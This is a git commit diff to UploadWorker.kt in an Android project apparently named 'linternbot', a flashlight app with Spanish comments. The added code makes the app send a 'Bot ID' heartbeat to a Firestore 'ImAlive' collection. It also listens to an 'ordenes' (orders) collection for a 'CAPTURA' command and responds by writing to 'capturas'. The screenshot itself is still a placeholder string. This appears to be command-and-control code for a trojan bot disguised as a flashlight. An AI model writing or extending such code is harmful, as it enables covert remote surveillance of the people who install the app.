ad66585371930f028873b52006cf0144db2e74e8
NicolasCeaPorras <nicolasceaporras@gmail.com>
2022-03-21 18:49:56 +0100

    Antes de cambiar a foreground service

--- app/src/main/java/com/linternbot/UploadWorker.kt
+++ app/src/main/java/com/linternbot/UploadWorker.kt
@@ -4,6 +4,7 @@ import android.content.Context
 import android.util.Log
 import androidx.work.Worker
 import androidx.work.WorkerParameters
+import com.google.firebase.firestore.DocumentChange
 import com.google.firebase.firestore.ktx.firestore
 import com.google.firebase.ktx.Firebase
 import java.text.SimpleDateFormat
@@ -15,15 +16,38 @@ class UploadWorker(appContext: Context, workerParams: WorkerParameters): Worker(
         val c = Calendar.getInstance()
         val sdf = SimpleDateFormat("yyyy-MM-dd HH:mm:ss")
         val strDate: String = sdf.format(c.time)
+        val idBot =  inputData.getString("IDbot")
         // Do the work here--in this case, upload the images.
         val db = Firebase.firestore
         val user = hashMapOf(
-            "Bot ID" to idAndroid,
+            "Bot ID" to idBot,
             "Hora" to strDate
+        )
+
+        val captura = hashMapOf(
+            "Bot ID" to idBot,
+            "Hora" to strDate,
+            "Captura" to "Esto sería una captura de pantalla"
         )
 
         // Add a new document with a generated ID
         db.collection("ImAlive").document(strDate).set(user)
+
+        db.collection("ordenes")
+            .whereEqualTo("Primitiva", "CAPTURA")
+            .addSnapshotListener { snapshot, e ->
+                if (e != null) {
+                    Log.d("TAG", "Fallada la escucha de la primitiva.", e)
+                    return@addSnapshotListener
+                }
+
+                for (dc in snapshot!!.documentChanges) {
+                    when (dc.type) {
+                        DocumentChange.Type.ADDED -> db.collection("capturas").document(idBot.toString()).set(captura)
+                    }
+                }
+
+            }
 
         Log.d("TAG2","Se ejecuta la tarea programada")
 
